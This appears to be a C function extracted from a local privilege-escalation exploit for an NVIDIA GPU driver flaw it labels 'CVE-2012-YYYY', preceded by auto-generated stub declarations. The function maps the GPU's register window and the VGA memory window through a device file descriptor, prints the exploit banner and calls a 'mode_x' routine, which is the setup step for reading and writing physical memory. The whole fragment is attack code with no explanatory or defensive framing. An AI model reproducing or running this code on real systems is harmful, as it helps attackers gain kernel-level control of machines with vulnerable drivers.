
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef scalar_t__ uint64_t ;
typedef int uint32_t ;


 int volatile* MAP_FAILED ;
 int MAP_SHARED ;
 int PROT_READ ;
 int PROT_WRITE ;
 int volatile* cve_2012_YYYY ;
 void* mmap (int *,int,int,int ,int,scalar_t__) ;
 int mode_x (int volatile*) ;
 int munmap (void*,int) ;
 int printf (char*) ;

volatile uint32_t *nvidia_handle(int fd, uint64_t res) {

  volatile uint32_t *m;

  if (fd < 0)
    return MAP_FAILED;


  m = cve_2012_YYYY = mmap(((void*)0), 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, res + 0x619000);
  if (m != MAP_FAILED) {
    if ((m[0xf00/4] & 8) &&
        (m = mmap(((void*)0), 0x10000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, res + 0xa0000)) != MAP_FAILED) {
      printf("[*] CVE-2012-YYYY\n");

      mode_x(cve_2012_YYYY);

      return m;
    }
    munmap((void*)cve_2012_YYYY, 0x1000);
    m = cve_2012_YYYY = MAP_FAILED;
  }
  return m;
}
